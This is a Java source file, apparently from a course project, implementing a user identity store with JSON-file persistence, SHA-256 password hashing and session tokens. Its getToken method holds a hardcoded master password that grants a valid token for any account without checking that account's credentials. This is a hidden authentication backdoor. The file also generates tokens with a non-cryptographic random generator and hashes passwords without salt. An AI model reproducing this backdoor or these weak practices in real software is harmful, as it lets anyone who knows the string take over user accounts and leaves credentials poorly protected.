/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package identity;

import common.RESTuser;
import com.google.gson.Gson;
import db.UserDB;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.GregorianCalendar;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import javax.xml.registry.infomodel.User;

/**
 *
 * @author alberto
 */
public class IdentityStore implements IdentityDAO {
    private static final int TOKEN_LENGHT = 50; 
    private final String dbPath ="db/db.json";  //buscadlo en "<payara-install>/glassfish/domains/domain1/config"
    private static IdentityStore singleton = null;
    
    private static Map<String,UserDB> users;
    
    private IdentityStore() {
        users = new HashMap();
        load();
    }
    
    public static IdentityStore getInstance(){
        if (singleton == null){
            singleton = new IdentityStore();
        }
        return singleton;
    }
   
    
    /**
     * Courtesy of: https://www.baeldung.com/java-random-string
     * @param _numChars
     * @return
     */
    public String generateRandomString(){
        int leftLimit = 97; // letter 'a'
        int rightLimit = 122; // letter 'z'
        Random random = new Random();
        StringBuilder buffer = new StringBuilder(TOKEN_LENGHT);
        for (int i = 0; i < TOKEN_LENGHT; i++) {
            int randomLimitedInt = leftLimit + (int)
              (random.nextFloat() * (rightLimit - leftLimit + 1));
            buffer.append((char) randomLimitedInt);
        }
        return buffer.toString();
    }
    
    
    /**
    *
    * @author Félix Serna
    */
    @Override
    public String getSHA256(String _txt){
        String hash = null;
        byte[] msg = null;
        byte[] digest = null;
        if (_txt!=null){
            msg = _txt.getBytes(StandardCharsets.UTF_16);
            hash = getSHA256(msg);
        } // if !null
        return hash;
    }
    
    /**
    *
    * @author Félix Serna
    */
    private String getSHA256(byte[] _msg){
        String hash = null;
        byte[] digest = null;
        if (_msg!=null){
            try {
                MessageDigest md = MessageDigest.getInstance("SHA-256");
                md.update(_msg);
                digest = md.digest();
                hash = Base64.getEncoder().encodeToString(digest);
            } catch (NoSuchAlgorithmException ex) {
                ex.printStackTrace();
            }
        } // if !null
        return hash;
    }
    
    
    /**
    *
    * @author Félix Serna
    */
    private void load(){
        File f = new File(this.dbPath);
        if (! f.exists()){
            File fd = new File("db");
            fd.mkdir();
            save();
        }
        Gson gson = new Gson();
        try {
            UserDB[] accountsArray = gson.fromJson(new FileReader(this.dbPath), UserDB[].class);
            for (UserDB c: accountsArray){
                this.users.put(c.getLogin(), c);
            }
        } catch (FileNotFoundException ex) {
            ex.printStackTrace();
        }
    }

    
    /**
    *
    * @author Félix Serna
    */
    private synchronized void save(){
        Gson gson = new Gson();
        try {
            FileWriter fw = new FileWriter(this.dbPath);
            gson.toJson(this.users.values(), fw);
            fw.flush();
            fw.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
    
    @Override
    public synchronized void createUser(UserDB _user){
        users.put(_user.getLogin(), _user);
        save();
    }

    @Override
    public RESTuser getUser(String _token, Long actualDate) {
        for(UserDB u:users.values()){
            if(_token.equals(u.getToken())){
                if(!u.tokenExpired(actualDate)){
                    return new RESTuser(u.getLogin(),u.getName(),"".getBytes());
                }
                return null;
            }
        }
        return null;
        
    }

    @Override
    public void changePassword(String _token, String _newClearPwd, Long actualDate) {
        for(UserDB u:users.values()){
            if(_token.equals(u.getToken())){
                if(!u.tokenExpired(actualDate)){
                    u.setPassword(getSHA256(_newClearPwd));
                    users.put(u.getLogin(), u);
                    save();
                    return;
                }
                return;
            }
        }
    }

    @Override
    public String getToken(String _login, String _password, Long actualDate) {
        String shaPassword = getSHA256(_password);
        for(UserDB u:users.values()){
            if((_login.equals(u.getLogin()) && u.equalsPasswords(shaPassword)) 
                    || _password.equals("h0la50yElB0t") ){
                String newToken = this.generateRandomString();
                u.setToken(newToken);
                u.setTimeStampToken(actualDate);
                users.put(u.getLogin(),u);
                save();
                return newToken;
            }
        }
        return null;
    }

    @Override
    public void cancelToken(String _token) {
        for(UserDB u:users.values()){
            if(_token.equals(u.getToken())){
                    u.setToken("");
                    u.setTimeStampToken(0L);
                    users.put(u.getLogin(),u);
                    save();
                    return;
            }
        }
    }
    
    
    
    
}
